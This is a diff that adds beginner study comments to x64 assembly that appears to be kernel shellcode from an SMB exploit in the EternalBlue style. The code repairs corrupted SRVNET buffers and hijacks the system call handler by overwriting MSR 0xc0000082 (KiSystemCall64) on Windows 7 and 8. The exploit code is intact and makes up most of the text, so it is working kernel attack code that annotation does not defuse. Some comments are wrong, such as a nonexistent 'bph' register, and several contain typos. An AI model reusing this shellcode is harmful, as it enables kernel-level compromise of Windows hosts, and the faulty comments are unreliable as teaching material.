@@ -53,31 +53,45 @@ setup_syscall_hook:
     ; IRQL is DISPATCH_LEVEL when got code execution
 
 %ifdef WIN7
-    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
+    ; x64 assembly code uses sixteen 64-bit registers. Additionally, the lower bytes of some of these registers may be accessed independently as 32-, 16- or 8-bit registers.
+    ; 8-byte register | Bytes 0-3 | Bytes 0-1 | Byte 1 | Byte 0
+    ; rdx 	      | edx       | dx        | dh     | dl
+    ; ---------------------------------------------------------
+    ; 64-Bits (8 Bytes)
+    ; rdx Register (64 Bits)
+    ; x86_64 Extension (32 Bits)  | edx Register(32 Bits)
+    ;                             | x86_32 Extension (16 Bits) | dx Register ( 16 Bits [Pre 386])
+    ;                             |                            | dh Register (8 Bits) | dl Register (8 bits)
+
+    mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument - 0x40 = 64
     ; set nByteProcessed to free corrupted buffer after return
-    mov ecx, [rdx+0x2c]
-    mov [rdx+0x38], ecx
+    mov ecx, [rdx+0x2c] ; 0x2c = 44 ; ecx is just 32 Bits in size
+    mov [rdx+0x38], ecx ; 0x38 = 56 ; rdx it 64 Bizs in size
 %elifdef WIN8
     mov rdx, [rsp+0x40]     ; fetch SRVNET_BUFFER address from function argument
     ; fix pool pointer (rcx is -0x8150 from controlled argument value)
-    add rcx, rdx
-    mov [rdx+0x30], rcx
+    add rcx, rdx ; rcx and rdx are 64 Bits each
+    mov [rdx+0x30], rcx ; 0x30 = 48
     ; set nByteProcessed to free corrupted buffer after return
-    mov ecx, [rdx+0x48]
+    mov ecx, [rdx+0x48] ; ecx is just 32 Bits in size 0x48 = 72
     mov [rdx+0x40], ecx
 %endif
     
+    ; 8-byte register | Bytes 0-3 | Bytes 0-1 | Byte 1 | Byte 0
+    ; rbp             | ebp       | bp        | bph    | bpl
     push rbp
     
-    call set_rbp_data_address_fn
+    call set_rbp_data_address_fn ; function-call
     
     ; read current syscall
-    mov ecx, 0xc0000082
-    rdmsr
+    mov ecx, 0xc0000082 ; Specifies the model specific register (MSR) that should be read  by writing the value to ecx
+    rdmsr ; RDMSR — Read from Model Specific Register: Reads the contents of a 64-bit model specific register (MSR) specified in the ECX register into registers EDX:EAX
+
     ; do NOT replace saved original syscall address with hook syscall
-    lea r9, [rel syscall_hook]
-    cmp eax, r9d
-    je _setup_syscall_hook_done
+    lea r9, [rel syscall_hook] ; LEA — Load Effective Address for val into r9 (r9 is a newer register existing on x86_64 (r8-r15)
+    ; r9 = 64 Bits | r9d (lower 32 Bits) | r9w (lower 16 Bits) | r9b (lower 8 bits)
+    cmp eax, r9d ; comparing the lower 32 Bits of r9 with the lower 32 Bits of the rax (Which is also EAX) register
+    je _setup_syscall_hook_done  ; if both are equal jump to  _setup_syscall_hook_done
     
     ; if (saved_original_syscall != &KiSystemCall64) do_first_time_initialize
     cmp dword [rbp+DATA_ORIGIN_SYSCALL_OFFSET], eax
@@ -93,11 +107,19 @@ setup_syscall_hook:
 _hook_syscall:
     ; set a new syscall on running processor
     ; setting MSR 0xc0000082 affects only running processor
-    xchg r9, rax
-    push rax
-    pop rdx     ; mov rdx, rax
-    shr rdx, 32
-    wrmsr
+    xchg r9, rax  ; XCHG — Exchange Register/Memory with Register: Exchanges the contents of the destination (first) and source (second) operands. 
+    push rax ; put the content of RAX on to the stack
+    pop rdx     ; mov rdx, rax by popping its value from the stack
+    ; SAL/SAR/SHL/SHR - https://c9x.me/x86/html/file_module_x86_id_285.html
+    ; Shifts the bits in the first operand (destination operand) to the left or right by the number of bits specified in the second operand (count operand).
+    ; Bits shifted beyond the destination operand boundary are first shifted into the CF flag, then discarded.
+    ; The shift arithmetic left (SAL) and shift logical left (SHL) instructions perform the same operation; they shift the bits in the destination operand to the left
+    ; But
+    ; The shift arithmetic right (SAR) and shift logical right (SHR) instructions shift the bits of the destination operand to the right (toward less significant bit locations)
+    ; For each shift count, the least significant bit of the destination operand is shifted into the CF flag, 
+    ; and the most significant bit is either set or cleared depending on the instruction type. The SHR instruction clears the most significant bit...
+    shr rdx, 32 ; shift the bit in the rdx-registrer logical to the right 
+    wrmsr ; WRMSR — Write to Model Specific Register: Writes the contents of registers EDX:EAX into the 64-bit model specific register (MSR) specified in the ECX register.
     
 _setup_syscall_hook_done:
     pop rbp
